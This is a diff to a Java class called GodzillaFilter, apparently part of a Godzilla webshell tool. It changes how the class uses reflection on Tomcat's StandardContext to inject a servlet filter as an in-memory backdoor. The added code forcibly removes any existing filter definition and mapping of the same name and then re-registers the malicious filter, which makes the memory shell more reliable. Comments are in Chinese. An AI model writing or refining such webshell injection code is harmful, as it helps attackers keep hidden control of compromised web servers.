@@ -174,64 +174,107 @@ public class GodzillaFilter extends ClassLoader implements Filter {
         Filter filter = this;
         String filterName = this.path;
         String url = this.path;
-        if (servletContext.getFilterRegistration(filterName) == null) {
-            Field contextField = null;
-            ApplicationContext applicationContext = null;
-            StandardContext standardContext = null;
-            Field stateField = null;
-            Dynamic filterRegistration = null;
 
-            String var11;
-            try {
-                contextField = servletContext.getClass().getDeclaredField("context");
-                contextField.setAccessible(true);
-                applicationContext = (ApplicationContext)contextField.get(servletContext);
-                contextField = applicationContext.getClass().getDeclaredField("context");
-                contextField.setAccessible(true);
-                standardContext = (StandardContext)contextField.get(applicationContext);
-                stateField = LifecycleBase.class.getDeclaredField("state");
-                stateField.setAccessible(true);
-                stateField.set(standardContext, LifecycleState.STARTING_PREP);
-                filterRegistration = servletContext.addFilter(filterName, filter);
-                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
-                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
-                filterStartMethod.setAccessible(true);
-                filterStartMethod.invoke(standardContext, (Object[])null);
-                stateField.set(standardContext, LifecycleState.STARTED);
-                var11 = null;
+        Field contextField = null;
+        ApplicationContext applicationContext = null;
+        StandardContext standardContext = null;
+        Field stateField = null;
+        Dynamic filterRegistration = null;
 
-                Class filterMap;
+        String var11;
+        try {
+            contextField = servletContext.getClass().getDeclaredField("context");
+            contextField.setAccessible(true);
+            applicationContext = (ApplicationContext)contextField.get(servletContext);
+            contextField = applicationContext.getClass().getDeclaredField("context");
+            contextField.setAccessible(true);
+            standardContext = (StandardContext)contextField.get(applicationContext);
+            stateField = LifecycleBase.class.getDeclaredField("state");
+            stateField.setAccessible(true);
+            stateField.set(standardContext, LifecycleState.STARTING_PREP);
+
+            String existsMsg = null;
+            // 检查Filter是否已存在
+            if (servletContext.getFilterRegistration(filterName) != null) {
+                existsMsg = "Filter already exists, overwriting...";
+                // 删除旧的FilterDef和FilterMap
                 try {
-                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
-                } catch (Exception var21) {
-                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
-                }
-
-                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
-                Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));
-
-                for(int i = 0; i < filterMaps.length; ++i) {
-                    Object filterMapObj = filterMaps[i];
-                    findFilterMaps = filterMap.getMethod("getFilterName");
-                    String name = (String)findFilterMaps.invoke(filterMapObj);
-                    if (name.equalsIgnoreCase(filterName)) {
-                        filterMaps[i] = filterMaps[0];
-                        filterMaps[0] = filterMapObj;
+                    // 删除FilterMap
+                    Class filterMapClass;
+                    try {
+                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+                    } catch (Exception e) {
+                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                     }
-                }
+                    Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
+                    Object[] filterMaps = (Object[]) findFilterMaps.invoke(standardContext);
 
-                String var25 = "Success";
-                return var25;
-            } catch (Exception var22) {
-                var11 = var22.getMessage();
-            } finally {
-                stateField.set(standardContext, LifecycleState.STARTED);
+                    java.util.List<Object> filterMapsList = new java.util.ArrayList<>();
+                    for (Object map : filterMaps) {
+                        Method getFilterName = filterMapClass.getMethod("getFilterName");
+                        String name = (String) getFilterName.invoke(map);
+                        if (!name.equalsIgnoreCase(filterName)) {
+                            filterMapsList.add(map);
+                        }
+                    }
+
+                    // 重新设置filterMaps
+                    Field filterMapsField = standardContext.getClass().getDeclaredField("filterMaps");
+                    filterMapsField.setAccessible(true);
+                    filterMapsField.set(standardContext, filterMapsList.toArray((Object[]) java.lang.reflect.Array.newInstance(filterMapClass, 0)));
+
+                    // 删除FilterDef
+                    Method findFilterDef = standardContext.getClass().getMethod("findFilterDef", String.class);
+                    Object filterDef = findFilterDef.invoke(standardContext, filterName);
+                    if (filterDef != null) {
+                        Method removeFilterDef = standardContext.getClass().getMethod("removeFilterDef", filterDef.getClass());
+                        removeFilterDef.invoke(standardContext, filterDef);
+                    }
+                } catch (Exception e) {
+                    // 删除失败，忽略
+                }
             }
 
-            return var11;
-        } else {
-            return "Filter already exists";
+            filterRegistration = servletContext.addFilter(filterName, filter);
+            filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
+            Method filterStartMethod = StandardContext.class.getMethod("filterStart");
+            filterStartMethod.setAccessible(true);
+            filterStartMethod.invoke(standardContext, (Object[])null);
+            stateField.set(standardContext, LifecycleState.STARTED);
+            var11 = null;
+
+            Class filterMap;
+            try {
+                filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+            } catch (Exception var21) {
+                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
+            }
+
+            Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
+            Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));
+
+            for(int i = 0; i < filterMaps.length; ++i) {
+                Object filterMapObj = filterMaps[i];
+                findFilterMaps = filterMap.getMethod("getFilterName");
+                String name = (String)findFilterMaps.invoke(filterMapObj);
+                if (name.equalsIgnoreCase(filterName)) {
+                    filterMaps[i] = filterMaps[0];
+                    filterMaps[0] = filterMapObj;
+                }
+            }
+
+            String var25 = "Success";
+            if (existsMsg != null) {
+                return existsMsg + " " + var25;
+            }
+            return var25;
+        } catch (Exception var22) {
+            var11 = var22.getMessage();
+        } finally {
+            stateField.set(standardContext, LifecycleState.STARTED);
         }
+
+        return var11;
     }
 
     public void init(FilterConfig filterConfig) throws ServletException {
